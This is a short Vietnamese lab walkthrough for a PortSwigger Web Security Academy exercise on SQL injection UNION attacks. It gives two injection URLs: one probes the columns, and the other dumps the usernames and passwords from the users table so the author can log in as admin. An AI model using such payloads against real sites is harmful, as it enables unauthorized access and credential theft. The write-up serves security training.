## SQL injection UNION attack, retrieving data from other tables

Ở đây chúng ta đã biết có 2 column như trong như phần description của lab có bảo là sử dụng table là **users** và có 2 trường là **username** và **password**, chúng ta sẽ select bừa các trường giá trị nào đó test thử xem web sẽ load như nào.

> Ví dụ: https://acd51f7e1f13167e80c95424009300ec.web-security-academy.net/filter?+category=Corporate+gifts%27+UNION+SELECT+%27abc%27,%27def%27--

(Chúng ta sẽ thấy 2 trường mà chúng ta select có xuất hiện thêm ở trên list category, chứng tỏ lỗi hiển thị sẽ nằm ở đây)

![](/imgs/SQL-Injection/6.png?raw=true)

Ok web load ổn, chúng ta sẽ tiến hành select username và password từ bảng **users**

https://acd51f7e1f13167e80c95424009300ec.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+username,password+FROM+users--

![](/imgs/SQL-Injection/7.png?raw=true)

Chúng ta sẽ thu được 3 user là wiener, admin và carlos.
Vào phần My Account và Login vào sẽ solve lab.

![](/imgs/SQL-Injection/8.png?raw=true)

